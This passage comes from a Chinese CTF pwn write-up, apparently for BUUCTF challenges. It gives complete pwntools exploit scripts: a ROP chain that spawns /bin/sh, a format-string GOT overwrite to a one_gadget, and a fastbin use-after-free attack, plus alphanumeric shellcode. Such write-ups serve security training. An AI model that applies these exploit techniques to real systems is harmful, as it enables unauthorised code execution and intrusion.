punctuation">(</span><span class="token string">'z.bin'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后克隆<code>github</code>上的<code>alpha3</code>并运行生成可见字符</p><pre class="line-numbers language-none"><code class="language-none">➜  mrctf2020_shellcode_revenge git clone https:&#x2F;&#x2F;github.com&#x2F;TaQini&#x2F;alpha3.git➜  alpha3 git:(master) ✗ python2 .&#x2F;ALPHA3.py x64 ascii mixedcase rax --input&#x3D;..&#x2F;z.binPh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t% <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>将生成的字符直接发送即可</p><h2 id="picoctf-2018-can-you-gets-me"><a href="#picoctf-2018-can-you-gets-me" class="headerlink" title="picoctf_2018_can_you_gets_me"></a><a href="https://buuoj.cn/challenges#picoctf_2018_can_you_gets_me">picoctf_2018_can_you_gets_me</a></h2><p>反编译之后有很多很长名字<code>IO</code>什么的的函数且<code>main</code>函数最后一个是<code>gets</code>，直接找<code>rop</code>发送即可：<code>ROPgadget --binary pwn --ropchain</code></p><p>注意加上<code>from struct import pack</code>并且发送时要先填充完变量和<code>rbp</code></p><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> struct <span class="token keyword">import</span> packcontext<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token comment"># Padding goes here</span>p <span class="token operator">=</span> <span class="token string">b''</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806f02a</span><span class="token punctuation">)</span> <span class="token comment"># pop edx ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea060</span><span class="token punctuation">)</span> <span class="token comment"># @ .data</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080b81c6</span><span class="token punctuation">)</span> <span class="token comment"># pop eax ; ret</span>p <span class="token operator">+=</span> <span class="token string">b'/bin'</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080549db</span><span class="token punctuation">)</span> <span class="token comment"># mov dword ptr [edx], eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806f02a</span><span class="token punctuation">)</span> <span class="token comment"># pop edx ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea064</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 4</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080b81c6</span><span class="token punctuation">)</span> <span class="token comment"># pop eax ; ret</span>p <span class="token operator">+=</span> <span class="token string">b'//sh'</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080549db</span><span class="token punctuation">)</span> <span class="token comment"># mov dword ptr [edx], eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806f02a</span><span class="token punctuation">)</span> <span class="token comment"># pop edx ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea068</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08049303</span><span class="token punctuation">)</span> <span class="token comment"># xor eax, eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080549db</span><span class="token punctuation">)</span> <span class="token comment"># mov dword ptr [edx], eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080481c9</span><span class="token punctuation">)</span> <span class="token comment"># pop ebx ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea060</span><span class="token punctuation">)</span> <span class="token comment"># @ .data</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080de955</span><span class="token punctuation">)</span> <span class="token comment"># pop ecx ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea068</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806f02a</span><span class="token punctuation">)</span> <span class="token comment"># pop edx ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea068</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08049303</span><span class="token punctuation">)</span> <span class="token comment"># xor eax, eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a86f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a86f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a86f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a86f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a86f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a86f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a86f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a86f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a86f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a86f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807a86f</span><span class="token punctuation">)</span> <span class="token comment"># inc eax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806cc25</span><span class="token punctuation">)</span> <span class="token comment"># int 0x80</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'GIVE ME YOUR NAME!'</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x18</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="axb-2019-fmt64"><a href="#axb-2019-fmt64" class="headerlink" title="axb_2019_fmt64"></a><a href="https://buuoj.cn/challenges#axb_2019_fmt64">axb_2019_fmt64</a></h2><p>检查保护</p><pre class="line-numbers language-none"><code class="language-none">➜  axb_2019_fmt64 checksec pwn[*] &#39;&#x2F;home&#x2F;starrysky&#x2F;buuctf&#x2F;axb_2019_fmt64&#x2F;pwn&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x3fe000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>反汇编看一下</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  char s[272]; &#x2F;&#x2F; [rsp+10h] [rbp-250h] BYREF  char format[312]; &#x2F;&#x2F; [rsp+120h] [rbp-140h] BYREF  unsigned __int64 v5; &#x2F;&#x2F; [rsp+258h] [rbp-8h]  v5 &#x3D; __readfsqword(0x28u);  setbuf(stdout, 0LL);  setbuf(stdin, 0LL);  setbuf(stderr, 0LL);  puts(    &quot;Hello,I am a computer Repeater updated.\n&quot;    &quot;After a lot of machine learning,I know that the essence of man is a reread machine!&quot;);  puts(&quot;So I&#39;ll answer whatever you say!&quot;);  while ( 1 )  &#123;    alarm(3u);    memset(s, 0, 0x101uLL);    memset(format, 0, 0x12CuLL);    printf(&quot;Please tell me:&quot;);    read(0, s, 0x100uLL);    sprintf(format, &quot;Repeater:%s\n&quot;, s);    if ( (unsigned int)strlen(format) &gt; 270 )      break;    printf(format);  &#125;  printf(&quot;what you input is really long!&quot;);  exit(0);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这是一道64位的栈上的格式化字符串，直接改<code>printf</code>为<code>ogg</code>即可，需要注意<code>printf</code>的零截断以及改低位时减去<code>Repeater:</code>的长度，可以多次输入但每次会将变量置零，因此只能一次性修改</p><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">29275</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">'%83$p'</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Repeater:'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x20830</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.23/lib/x86_64-linux-gnu/libc-2.23.so'</span><span class="token punctuation">)</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45216</span><span class="token punctuation">,</span> <span class="token number">0x4526a</span><span class="token punctuation">,</span> <span class="token number">0xf02a4</span><span class="token punctuation">,</span> <span class="token number">0xf1147</span><span class="token punctuation">]</span>gadget <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseprintf <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>ogg1 <span class="token operator">=</span> gadget <span class="token operator">&amp;</span> <span class="token number">0xff</span>ogg2 <span class="token operator">=</span> <span class="token punctuation">(</span>gadget<span class="token operator">>></span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span>p <span class="token operator">=</span> <span class="token string">b'%'</span> <span class="token operator">+</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>ogg1 <span class="token operator">-</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'c%11$hhn'</span> <span class="token operator">+</span> <span class="token string">b'%'</span> <span class="token operator">+</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>ogg2 <span class="token operator">-</span> ogg1<span class="token punctuation">)</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'c%12$hn'</span>p <span class="token operator">=</span> p<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>printf<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>printf <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'Please tell me:'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="wustctf2020-easyfast"><a href="#wustctf2020-easyfast" class="headerlink" title="wustctf2020_easyfast"></a><a href="https://buuoj.cn/challenges#wustctf2020_easyfast">wustctf2020_easyfast</a></h2><p>检查保护，没开地址随机化</p><pre class="line-numbers language-none"><code class="language-none">➜  wustctf2020_easyfast checksec pwn[*] &#39;&#x2F;home&#x2F;starrysky&#x2F;buuctf&#x2F;wustctf2020_easyfast&#x2F;pwn&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x3ff000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>delete</code>函数中存在<code>UAF</code>漏洞</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">unsigned __int64 __fastcall delete()&#123;  __int64 index; &#x2F;&#x2F; [rsp+8h] [rbp-28h]  char s[24]; &#x2F;&#x2F; [rsp+10h] [rbp-20h] BYREF  unsigned __int64 v3; &#x2F;&#x2F; [rsp+28h] [rbp-8h]  v3 &#x3D; __readfsqword(0x28u);  puts(&quot;index&gt;&quot;);  fgets(s, 8, stdin);  index &#x3D; atoi(s);  free(buf[index]);                             &#x2F;&#x2F; uaf  return __readfsqword(0x28u) ^ v3;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>存在一个可以直接<code>getshell</code>的函数，但是要将<code>target</code>值改成<code>0</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">__int64 __fastcall show()&#123;  __int64 result; &#x2F;&#x2F; rax  if ( target )    LODWORD(result) &#x3D; puts(&quot;Not yet&quot;);  else    LODWORD(result) &#x3D; system(&quot;&#x2F;bin&#x2F;sh&quot;);  return result;&#125;__int64 __fastcall show()&#123;  __int64 result; &#x2F;&#x2F; rax  if ( target )    LODWORD(result) &#x3D; puts(&quot;Not yet&quot;);  else    LODWORD(result) &#x3D; system(&quot;&#x2F;bin&#x2F;sh&quot;);  return result;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个地址附近能找到两个<code>fake_chunk</code>，由于<code>edit</code>函数中只能输入<code>8</code>个字节因此选择第二个，改<code>fd</code>为<code>fake_chunk</code>地址申请出来再<code>edit</code>将<code>target</code>改成<code>0</code>即可通过<code>vuln</code>函数<code>getshell</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; find_fake_fast 0x602090FAKE CHUNKSFake chunk | Allocated chunkAddr: 0x60206aprev_size: 0x78600007fc46d05size: 0x40fd: 0x00bk: 0x50000000000000fd_nextsize: 0x00bk_nextsize: 0x00Fake chunk | Allocated chunkAddr: 0x602080prev_size: 0x00size: 0x50fd: 0x00bk: 0x00fd_nextsize: 0x7fc46d3e5620bk_nextsize: 0x00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size>'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index>'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice>'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index>'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice>'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>target <span class="token operator">=</span> <span class="token number">0x602090</span>add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>target <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>vuln<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="wustctf2020-name-your-cat"><a href="#wustctf2020-name-your-cat" class="headerlink" title="wustctf2020_name_your_cat"></a><a href="https://buuoj.cn/challenges#wustctf2020_name_your_cat">wustctf2020_name_your_cat</a></h2><p>检查保护</p><pre class="line-numbers language-none"><code class="language-none">➜  wustctf2020_name_your_cat checksec pwn[*] &#39;&#x2F;home&#x2F;starrysky&#x2F;buuctf&#x2F;wustctf2020_name_your_cat&#x2F;pwn&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这题主要考的是逆向读代码，对<code>index</code>没有限制，虽然开了<code>canary</code>不能直接溢出但是可以通过数组定位直接任意地址写，<code>v1</code>是栈上的一个地址，计算其与保存了返回到<code>main</code>函数的地址的偏移再除以<code>8</code>即可向返回地址写入，改成<code>shell</code>函数即可<code>getshell</code>，但是要把5次循环结束</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">int __cdecl NameWhich(int v1)&#123;  int index[4]; &#x2F;&#x2F; [esp+18h] [ebp-10h] BYREF  index[1] &#x3D; __readgsdword(0x14u);  printf(&quot;Name for which?\n&gt;&quot;);  __isoc99_scanf(&quot;%d&quot;, index);  printf(&quot;Give your name plz: &quot;);  __isoc99_scanf(&quot;%7s&quot;, 8 * index[0] + v1);  return index[0];&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span 